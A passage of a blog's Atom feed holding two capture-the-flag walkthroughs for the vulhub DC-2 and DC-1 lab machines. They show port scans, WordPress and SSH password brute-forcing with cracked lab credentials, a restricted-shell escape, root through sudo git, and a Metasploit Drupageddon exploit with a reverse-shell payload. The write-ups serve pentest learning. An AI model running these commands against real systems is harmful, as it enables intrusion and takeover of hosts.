<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>f1oat&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-01-14T08:27:58.223Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>f1oat</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DC-2</title>
    <link href="http://example.com/2021/01/14/DC-2/"/>
    <id>http://example.com/2021/01/14/DC-2/</id>
    <published>2021-01-14T07:57:56.000Z</published>
    <updated>2021-01-14T08:27:58.223Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="vulhub-DC-2-pentest"><a href="#vulhub-DC-2-pentest" class="headerlink" title="vulhub DC-2 pentest"></a>vulhub DC-2 pentest</h2><a id="more"></a><h2 id="collect-message"><a href="#collect-message" class="headerlink" title="collect message"></a>collect message</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.26.114.94  netmask 255.255.240.0  broadcast 172.26.127.255</span><br><span class="line">        inet6 fe80::a00:27ff:fe5c:6526  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 08:00:27:5c:65:26  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 4226  bytes 539314 (526.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 41604  bytes 2529267 (2.4 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 2088  bytes 90758 (88.6 KiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 2088  bytes 90758 (88.6 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop# nmap -sS 172.26.112.0/20 -p 80 --open</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-14 00:13 EST</span><br><span class="line"></span><br><span class="line">root@kali:~/Desktop# nmap -sS 172.26.112.0/20 -p 80 --open --oN DC-2.nmap</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-14 00:13 EST</span><br><span class="line">Nmap scan report for DC-2.mshome.net (172.26.118.49)</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:A0:92:5B (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 4096 IP addresses (3 hosts up) scanned in 84.32 seconds</span><br></pre></td></tr></table></figure><p>scan port </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS 172.26.118.49 -p-</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-14 03:08 EST</span><br><span class="line">Nmap scan report for dc-2 (172.26.118.49)</span><br><span class="line">Host is up (0.00050s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">80/tcp   open  http</span><br><span class="line">7744/tcp open  raqmon-pdu</span><br><span class="line">MAC Address: 08:00:27:A0:92:5B (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.10 seconds</span><br></pre></td></tr></table></figure><p>port 7744 is interesting<br>more Detect</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sS 172.26.118.49 -p 80,7744 -A</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-14 03:11 EST</span><br><span class="line">Nmap scan report for dc-2 (172.26.118.49)                                                                                                                      </span><br><span class="line">Host is up (0.0011s latency).                                                                                                                                  </span><br><span class="line">                                                                                                                                                               </span><br><span class="line">PORT     STATE SERVICE VERSION                                                                                                                                 </span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.10 ((Debian))                                                                                                          </span><br><span class="line">|_http-generator: WordPress 4.7.10                                                                                                                             </span><br><span class="line">|_http-server-header: Apache/2.4.10 (Debian)</span><br><span class="line">|_http-title: DC-2 &amp;#8211; Just another WordPress site</span><br><span class="line">|_https-redirect: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)</span><br><span class="line">|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)</span><br><span class="line">|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)</span><br><span class="line">|_  256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)</span><br><span class="line">MAC Address: 08:00:27:A0:92:5B (Oracle VirtualBox virtual NIC)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.06 ms dc-2 (172.26.118.49)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 9.91 seconds</span><br></pre></td></tr></table></figure><p>add hosts</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line"></span><br><span class="line">visit homepage</span><br></pre></td></tr></table></figure><h3 id="Brute-dir"><a href="#Brute-dir" class="headerlink" title="Brute dir"></a>Brute dir</h3><p>dirb <a href="http://dc-2/">http://dc-2/</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">+ http://dc-2/index.php (CODE:301|SIZE:0)                                                                                                                                    </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/                                                                                            </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/                                                                                          </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-includes/                                                                                         </span><br><span class="line">+ http://dc-2/xmlrpc.php (CODE:405|SIZE:42)                                                                                     </span><br><span class="line">                                                                                                                                </span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/ ----</span><br><span class="line">+ http://dc-2/wp-admin/admin.php (CODE:302|SIZE:0)                                                                              </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/css/                                                                                        </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/images/                                                                                     </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/includes/                                                                                   </span><br><span class="line">+ http://dc-2/wp-admin/index.php (CODE:302|SIZE:0)                                                                              </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/js/                                                                                         </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/maint/                                                                                      </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/network/                                                                                    </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-admin/user/                                                                                       </span><br><span class="line">                                                                                                                                </span><br><span class="line">---- Entering directory: http://dc-2/wp-content/ ----</span><br><span class="line">+ http://dc-2/wp-content/index.php (CODE:200|SIZE:0)                                                                            </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/languages/                                                                                </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/plugins/                                                                                  </span><br><span class="line">==&gt; DIRECTORY: http://dc-2/wp-content/themes/                                                                                   </span><br><span class="line">                                                                                                                                </span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/network/ ----</span><br><span class="line">+ http://dc-2/wp-admin/network/admin.php (CODE:302|SIZE:0)                                                                      </span><br><span class="line">+ http://dc-2/wp-admin/network/index.php (CODE:302|SIZE:0)                                                                      </span><br><span class="line">                                                                                                                                </span><br><span class="line">---- Entering directory: http://dc-2/wp-admin/user/ ----</span><br><span class="line">+ http://dc-2/wp-admin/user/admin.php (CODE:302|SIZE:0)                                                                         </span><br><span class="line">+ http://dc-2/wp-admin/user/index.php (CODE:302|SIZE:0)                                                                         </span><br><span class="line">                                                                                                                                </span><br><span class="line">---- Entering directory: http://dc-2/wp-content/languages/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode &#x27;-w&#x27; if you want to scan it anyway)</span><br><span class="line">                                                                                                                                </span><br><span class="line">---- Entering directory: http://dc-2/wp-content/plugins/ ----</span><br><span class="line">+ http://dc-2/wp-content/plugins/index.php (CODE:200|SIZE:0)                                                                    </span><br><span class="line">                                                                                                                                </span><br><span class="line">---- Entering directory: http://dc-2/wp-content/themes/ ----</span><br><span class="line">+ http://dc-2/wp-content/themes/index.php (CODE:200|SIZE:0) </span><br></pre></td></tr></table></figure><p>obviously webcms is wordpress</p><h1 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h1><h2 id="found-flag1"><a href="#found-flag1" class="headerlink" title="found flag1"></a>found flag1</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag 1</span><br><span class="line">Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</span><br><span class="line"></span><br><span class="line">More passwords is always better, but sometimes you just can’t win them all.</span><br><span class="line"></span><br><span class="line">Log in as one to see the next flag.</span><br><span class="line"></span><br><span class="line">If you can’t find it, log in as another.</span><br></pre></td></tr></table></figure><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><p>we found Backstage management system</p><p>dir <a href="http://dc-2/wp-admin/network/admin.php">http://dc-2/wp-admin/network/admin.php</a></p><p>wpscan is a good tool for scanning wordpress websites,so start scanning<br>usage:<br>wpscan –url=’<a href="http://dc-2&/#39;">http://dc-2&#39;</a> –api-token=your token</p><p>but these vuln isn’t easy to use to attack</p><p>see flag1 may we should brute password</p><p>first looking for author</p><p>wpscan –url=”<a href="http://dc-2&quot;/">http://dc-2&quot;</a> -e u</p><p>admin / jerry / tom</p><p>flag1 prompt use cewl </p><p>cewl is costume word list generator</p><p>cewl <a href="http://dc-2/">http://dc-2</a> -w password.dic</p><p>wpscan –url=”<a href="http://dc-2&quot;/">http://dc-2&quot;</a> -U user.dic(include admin,jerry and tom) -P password.dic</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Performing password attack on Xmlrpc against 3 user/s</span><br><span class="line">[SUCCESS] - jerry / adipiscing                                                                                                               </span><br><span class="line">[SUCCESS] - tom / parturient </span><br></pre></td></tr></table></figure><p>so try login as jeryy/tom</p><p>jerry:<br>got flag2</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure><h2 id="flag3-amp-flag4"><a href="#flag3-amp-flag4" class="headerlink" title="flag3&amp;flag4"></a>flag3&amp;flag4</h2><p>It’s hard to getshell-&gt; flag2 prompt us try another way</p><p>hydra -L user.dic -P password.dic ssh://172.26.118.49 -vV -o dc2.ssh </p><p>obtain username:tom  password:parturient </p><p>so ssh <a href="mailto:&#x74;&#x6f;&#x6d;&#x40;&#x31;&#55;&#x32;&#x2e;&#50;&#x36;&#46;&#49;&#49;&#56;&#46;&#x34;&#57;">&#x74;&#x6f;&#x6d;&#x40;&#x31;&#55;&#x32;&#x2e;&#50;&#x36;&#46;&#49;&#49;&#56;&#46;&#x34;&#57;</a> -p 7744<br>cat is not allow so less flag3.txt or vi flag3.txt<br>flag3.txt got it</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br><span class="line"></span><br><span class="line">obtain rbash</span><br><span class="line"></span><br><span class="line">ls /home/* -la</span><br><span class="line"></span><br><span class="line">jerry/flag4.txt</span><br><span class="line"></span><br><span class="line">less /jerry/flag4.txt</span><br><span class="line">got it!</span><br><span class="line">```tex</span><br><span class="line"></span><br><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure><h2 id="the-final-flag"><a href="#the-final-flag" class="headerlink" title="the final flag"></a>the final flag</h2><h3 id="rbash-escape"><a href="#rbash-escape" class="headerlink" title="rbash escape"></a>rbash escape</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br><span class="line"></span><br><span class="line">export PATH=<span class="formula">$PATH:/bin/</span></span><br><span class="line"><span class="formula"></span></span><br><span class="line"><span class="formula">export PATH=$</span>PATH:/usr/bin</span><br></pre></td></tr></table></figure><p>then you can use bash</p><h3 id="elevated-privileges"><a href="#elevated-privileges" class="headerlink" title="elevated privileges"></a>elevated privileges</h3><p>sudo -l</p><p>tom may not allow run sudo</p><p>login as jerry</p><p>su jerry </p><p>password:adipiscing</p><p>got it!</p><p>sudo -l</p><p>find jerry can run git</p><p>so try use git to elevated privileges</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$sudo git -p help config</span><br><span class="line"></span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br><span class="line">#whoami</span><br><span class="line">#root</span><br></pre></td></tr></table></figure><hr><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat final-flag.txt</span><br><span class="line">__    __     _ _       _                    _</span><br><span class="line">/ / /<span class="tag">\<span class="name"> </span></span><span class="tag">\<span class="name"> </span></span><span class="tag">\<span class="name">_</span></span>__| | |   __| | ___  _ __   ___  / <span class="tag">\</span></span><br><span class="line"><span class="tag">\<span class="name"> </span></span><span class="tag">\<span class="name">/</span></span>  <span class="tag">\<span class="name">/</span></span> / _ <span class="tag">\<span class="name"> </span></span>| |  / _` |/ _ <span class="tag">\<span class="name">|</span></span> &#x27;_ <span class="tag">\<span class="name"> </span></span>/ _ <span class="tag">\<span class="name">/</span></span>  /</span><br><span class="line"> <span class="tag">\<span class="name"> </span></span> /<span class="tag">\<span class="name"> </span></span> /  __/ | | | (_| | (_) | | | |  __/<span class="tag">\<span class="name">_</span></span>/ </span><br><span class="line">  <span class="tag">\<span class="name">/</span></span>  <span class="tag">\<span class="name">/</span></span> <span class="tag">\<span class="name">_</span></span>__|_|_|  <span class="tag">\<span class="name">_</span></span>_,_|<span class="tag">\<span class="name">_</span></span>__/|_| |_|<span class="tag">\<span class="name">_</span></span>__<span class="tag">\<span class="name">/</span></span>   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulatons!!!</span><br><span class="line"></span><br><span class="line">A special thanks to all those who sent me tweets</span><br><span class="line">and provided me with feedback - it&#x27;s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure><h3 id="think"><a href="#think" class="headerlink" title="think"></a>think</h3><p>if there is no way to get webshell,may we could find anthor way!It’s import for us who study pentest</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;DC-2&quot;&gt;&lt;a href=&quot;#DC-2&quot; class=&quot;headerlink&quot; title=&quot;DC-2&quot;&gt;&lt;/a&gt;DC-2&lt;/h1&gt;&lt;h2 id=&quot;vulhub-DC-2-pentest&quot;&gt;&lt;a href=&quot;#vulhub-DC-2-pentest&quot; class=&quot;headerlink&quot; title=&quot;vulhub DC-2 pentest&quot;&gt;&lt;/a&gt;vulhub DC-2 pentest&lt;/h2&gt;</summary>
    
    
    
    <category term="pentest" scheme="http://example.com/categories/pentest/"/>
    
    
    <category term="DC-2" scheme="http://example.com/tags/DC-2/"/>
    
  </entry>
  
  <entry>
    <title>DC-1</title>
    <link href="http://example.com/2021/01/13/DC-1/"/>
    <id>http://example.com/2021/01/13/DC-1/</id>
    <published>2021-01-13T07:21:58.000Z</published>
    <updated>2021-01-13T08:37:12.564Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vulhub-DC-1靶机渗透"><a href="#vulhub-DC-1靶机渗透" class="headerlink" title="vulhub DC-1靶机渗透"></a>vulhub DC-1靶机渗透</h1><a id="more"></a><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ifconfig</span><br><span class="line">eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.150.80  netmask 255.255.240.0  broadcast 192.168.159.255</span><br><span class="line">        inet6 fe80::a00:27ff:fe5c:6526  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 08:00:27:5c:65:26  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 2  bytes 688 (688.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 65  bytes 10552 (10.3 KiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><hr><p>ip与子网掩码相与得到网络的IP为 192.168.144.0/20</p><h3 id="主机发现以及端口扫描"><a href="#主机发现以及端口扫描" class="headerlink" title="主机发现以及端口扫描"></a>主机发现以及端口扫描</h3><p>nmap -sS 192.168.144.0/20<br>192.168.146.232为开放主机<br>nmap -sS -Pn 192.168.146.232<br>Nmap scan report for DC-1.mshome.net (192.168.146.232)<br>Host is up (0.00058s latency).<br>Not shown: 997 closed ports<br>PORT    STATE SERVICE<br>22/tcp  open  ssh<br>80/tcp  open  http<br>111/tcp open  rpcbind<br>MAC Address: 08:00:27:DB:C2:6F (Oracle VirtualBox virtual NIC)</p><p>开放80访问robots.txt<br>User-agent: *<br>Crawl-delay: 10<br>/# Directories<br>Disallow: /includes/<br>Disallow: /misc/<br>Disallow: /modules/<br>Disallow: /profiles/<br>Disallow: /scripts/<br>Disallow: /themes/<br>/# Files<br>Disallow: /CHANGELOG.txt<br>Disallow: /cron.php<br>Disallow: /INSTALL.mysql.txt<br>Disallow: /INSTALL.pgsql.txt<br>Disallow: /INSTALL.sqlite.txt<br>Disallow: /install.php<br>Disallow: /INSTALL.txt<br>Disallow: /LICENSE.txt<br>Disallow: /MAINTAINERS.txt<br>Disallow: /update.php<br>Disallow: /UPGRADE.txt<br>Disallow: /xmlrpc.php<br>/# Paths (clean URLs)<br>Disallow: /admin/<br>Disallow: /comment/reply/<br>Disallow: /filter/tips/<br>Disallow: /node/add/<br>Disallow: /search/<br>Disallow: /user/register/<br>Disallow: /user/password/<br>Disallow: /user/login/<br>Disallow: /user/logout/<br>/# Paths (no clean URLs)<br>Disallow: /?q=admin/<br>Disallow: /?q=comment/reply/<br>Disallow: /?q=filter/tips/<br>Disallow: /?q=node/add/<br>Disallow: /?q=search/<br>Disallow: /?q=user/password/<br>Disallow: /?q=user/register/<br>Disallow: /?q=user/login/<br>Disallow: /?q=user/logout/</p><p>通过update.txt install.txt获知<br>版本号为drupal 7.x<br>需求为</p><ul><li>PHP 5.2.4 (or greater) (<a href="http://www.php.net/">http://www.php.net/</a>).</li><li>One of the following databases:<ul><li>MySQL 5.0.15 (or greater) (<a href="http://www.mysql.com/">http://www.mysql.com/</a>).</li><li>MariaDB 5.1.44 (or greater) (<a href="http://mariadb.org/">http://mariadb.org/</a>). MariaDB is a fully<br>compatible drop-in replacement for MySQL.</li><li>PostgreSQL 8.3 (or greater) (<a href="http://www.postgresql.org/">http://www.postgresql.org/</a>).</li><li>SQLite 3.4.2 (or greater) (<a href="http://www.sqlite.org/">http://www.sqlite.org/</a>).</li></ul></li></ul><h3 id="路径扫描"><a href="#路径扫描" class="headerlink" title="路径扫描"></a>路径扫描</h3><p>dirb <a href="http://192.168.146.232/">http://192.168.146.232/</a><br>这里推荐一个目录扫描的工具SourceHacker<br>**<a href="https://github.com/WangYihang/SourceLeakHacker">SourceLeakHacker</a>**<br>  —- Scanning URL: <a href="http://192.168.146.232/">http://192.168.146.232/</a> —-</p><ul><li><a href="http://192.168.146.232/0">http://192.168.146.232/0</a> (CODE:200|SIZE:7648)                                                                                 </li><li><a href="http://192.168.146.232/admin">http://192.168.146.232/admin</a> (CODE:403|SIZE:7740)                                                                             </li><li><a href="http://192.168.146.232/Admin">http://192.168.146.232/Admin</a> (CODE:403|SIZE:7581)                                                                             </li><li><a href="http://192.168.146.232/ADMIN">http://192.168.146.232/ADMIN</a> (CODE:403|SIZE:7581)                                                                             </li><li><a href="http://192.168.146.232/batch">http://192.168.146.232/batch</a> (CODE:403|SIZE:7875)                                                                             </li><li><a href="http://192.168.146.232/cgi-bin/">http://192.168.146.232/cgi-bin/</a> (CODE:403|SIZE:291)<br>==&gt; DIRECTORY: <a href="http://192.168.146.232/includes/">http://192.168.146.232/includes/</a>                                                                                 </li><li><a href="http://192.168.146.232/index.php">http://192.168.146.232/index.php</a> (CODE:200|SIZE:7648)                                                                         </li><li><a href="http://192.168.146.232/install.mysql">http://192.168.146.232/install.mysql</a> (CODE:403|SIZE:296)                                                                      </li><li><a href="http://192.168.146.232/install.pgsql">http://192.168.146.232/install.pgsql</a> (CODE:403|SIZE:296)                                                                      </li><li><a href="http://192.168.146.232/LICENSE">http://192.168.146.232/LICENSE</a> (CODE:200|SIZE:18092)<br>==&gt; DIRECTORY: <a href="http://192.168.146.232/misc/">http://192.168.146.232/misc/</a><br>==&gt; DIRECTORY: <a href="http://192.168.146.232/modules/">http://192.168.146.232/modules/</a>                                                                                  </li><li><a href="http://192.168.146.232/node">http://192.168.146.232/node</a> (CODE:200|SIZE:7648)<br>==&gt; DIRECTORY: <a href="http://192.168.146.232/profiles/">http://192.168.146.232/profiles/</a>                                                                                 </li><li><a href="http://192.168.146.232/README">http://192.168.146.232/README</a> (CODE:200|SIZE:5376)                                                                            </li><li><a href="http://192.168.146.232/robots">http://192.168.146.232/robots</a> (CODE:200|SIZE:1561)                                                                            </li><li><a href="http://192.168.146.232/robots.txt">http://192.168.146.232/robots.txt</a> (CODE:200|SIZE:1561)                                                                        </li><li><a href="http://192.168.146.232/Root">http://192.168.146.232/Root</a> (CODE:403|SIZE:287)<br>==&gt; DIRECTORY: <a href="http://192.168.146.232/scripts/">http://192.168.146.232/scripts/</a>                                                                                  </li><li><a href="http://192.168.146.232/search">http://192.168.146.232/search</a> (CODE:403|SIZE:7584)                                                                            </li><li><a href="http://192.168.146.232/Search">http://192.168.146.232/Search</a> (CODE:403|SIZE:7584)                                                                            </li><li><a href="http://192.168.146.232/server-status">http://192.168.146.232/server-status</a> (CODE:403|SIZE:296)<br>==&gt; DIRECTORY: <a href="http://192.168.146.232/sites/">http://192.168.146.232/sites/</a><br>==&gt; DIRECTORY: <a href="http://192.168.146.232/themes/">http://192.168.146.232/themes/</a>                                                                                   </li><li><a href="http://192.168.146.232/user">http://192.168.146.232/user</a> (CODE:200|SIZE:7501)                                                                              </li><li><a href="http://192.168.146.232/web.config">http://192.168.146.232/web.config</a> (CODE:200|SIZE:2178)                                                                        </li><li><a href="http://192.168.146.232/xmlrpc.php">http://192.168.146.232/xmlrpc.php</a> (CODE:200|SIZE:42)</li></ul><hr><h3 id="漏洞发现-amp-漏洞利用"><a href="#漏洞发现-amp-漏洞利用" class="headerlink" title="漏洞发现&amp;漏洞利用"></a>漏洞发现&amp;漏洞利用</h3><p>use msf<br>msfconsole<br>search drupal<br>use exploit/multi/http/drupal_drupageddon<br>set payload php/meterpreter/reverse_tcp<br>接收到反弹shell后ls查看目录</p><p>find flag1</p><p>cat flag1.txt</p><p>Every good CMS needs a config file - and so do you.</p><p>因为开放了22端口所以查看home下的用户<br>找到了flag4<br>home/flag4</p><p>cat flag4.txt</p><p>Can you use this same method to find or access the flag in root?</p><p>Probably. But perhaps 